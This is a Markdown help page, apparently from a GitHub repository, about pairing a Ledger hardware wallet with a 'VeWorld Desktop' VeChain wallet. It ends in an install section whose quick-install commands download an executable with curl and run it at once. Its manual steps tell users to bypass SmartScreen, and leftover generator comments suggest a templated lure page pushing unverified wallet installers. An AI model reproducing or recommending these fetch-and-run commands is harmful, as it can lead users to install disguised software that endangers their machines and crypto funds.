![VeWorld Desktop](../assets/banner-article.png)

# Pair a VeChain Ledger With VeWorld Desktop: USB and First Signature

Three steps: cable, coin app, account

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> Every signature is approved on the device screen, so read it there rather than in the app window.

Pairing a Ledger with VeWorld Desktop takes three things: a USB connection, the VeChain app open on the device, and an account added inside the wallet. Once the account exists, every signature is approved on the device screen, and the keys never touch the computer.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You plugged the device in and nothing happened, or an account appeared but signatures fail, or you are about to move a balance from a software wallet to hardware and want to know what changes.

| Stage | What should happen | What usually goes wrong |
|---|---|---|
| Connection | Device recognised over USB | Cable is charge-only, or the port is a hub |
| App selection | VeChain app open on the device | A different coin app is open |
| Account add | An address derived from the device | Wrong index selected, empty account shown |
| Signature | Approval prompt on the device | Prompt seen on screen but not confirmed on device |

## Why it happens

A hardware wallet holds keys in a secure element and signs only after a physical confirmation. The computer never sees the key material, which is the entire point: a compromised machine can propose a transaction but cannot produce a signature without the device and a person pressing a button.

For that to work, the device has to be reachable. Native USB means the operating system exposes the device directly rather than through a browser bridge, and that is a lower-level connection than a web page can make. It also means the cable matters: many USB-C cables ship for charging only, with no data lines, and a charge-only cable produces a connection that appears to work and never does.

The VeChain app on the device is the second requirement. A Ledger runs one coin app at a time, and a device sitting in another app will not answer a VeChain request. Opening the right app is a step people skip because the device looks ready.

What the arrangement cannot do is protect a person from approving something they did not read. The device shows an amount and a destination, and the signature is only as informed as that confirmation. Reading the device screen rather than the app window is what makes hardware worth its cost, and it is a habit rather than a setting you can switch on.

Accounts come third. A Ledger derives a sequence of addresses from its own phrase, so adding an account means choosing which index to expose. The first is usually empty if the balance was received elsewhere, and an empty account on a connected device is a selection problem rather than a pairing failure.

## Fix

1. Connect the device with a cable you know carries data, directly to the machine rather than through a hub.
2. Unlock the device with its PIN and open <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-live-vs-veworld-desktop.md">the VeChain app for VeWorld Desktop</a>.
3. In VeWorld Desktop, start the Ledger account flow and wait for the device to be detected.
4. When the address is derived, confirm on the device screen that the address shown matches the one in the app.
5. Approve the account, then check the balance. If it is empty, add the next index and compare addresses with the wallet that holds the funds.
6. Send a small test transaction and approve it on the device before moving a larger amount.

## If that did not work

If the device is never detected, swap the cable first: it is the most common cause by a wide margin. Then try another port, and close any other application that may be holding the device open, because only one program can claim it at a time.

If the account appears but signatures fail, reopen the VeChain app and retry. A device that has gone to sleep between building and signing a transaction will not answer, and the app sees that as a failed signature rather than a sleeping device.

If the address on the device differs from the one in the app, stop and re-add the account. Signing an address you did not intend to use is how a balance ends up somewhere unexpected.

## Prevention

- Keep one data cable with the device, so a charge-only cable is never in play.
- Open the VeChain app before starting any Ledger flow.
- Confirm the address on the device screen the first time, every time.
- Never enter the <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">recovery phrase</a> anywhere except the device itself; it is never needed in the app.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Does the wallet ever see my Ledger keys?

No. The device signs internally and returns a signature. The key material stays in the secure element, which is why a compromised computer cannot move funds alone.

### Can I use a Ledger over Bluetooth with the desktop app?

The desktop pairing is a USB connection with the VeChain app open. Bluetooth belongs to the device's own mobile pairing, which is a separate arrangement.

### Why is the first Ledger account empty?

Because the balance is on a different index. A device derives many addresses, and the wallet shows the one you added.

### What happens if I lose the Ledger?

The device can be replaced and the same phrase restored on the new one, producing the same addresses. The phrase is the backup, not the device.

### Do I still need a wallet password with a Ledger?

Yes, for the app's local storage. It does not protect the keys, which stay on the device, but it protects everything the app keeps on the machine.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [When the device is not detected at all](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-sync-not-detected-veworld-desktop.md)
- [Using two Ledger devices with one wallet](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/two-vechain-ledger-wallets-veworld-desktop.md)
- [Whether a hardware wallet can still lose funds](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-wallet-losses-veworld-desktop.md)
- [What a zero balance means on a Ledger account](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md)
- [How self-custody works in this wallet](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)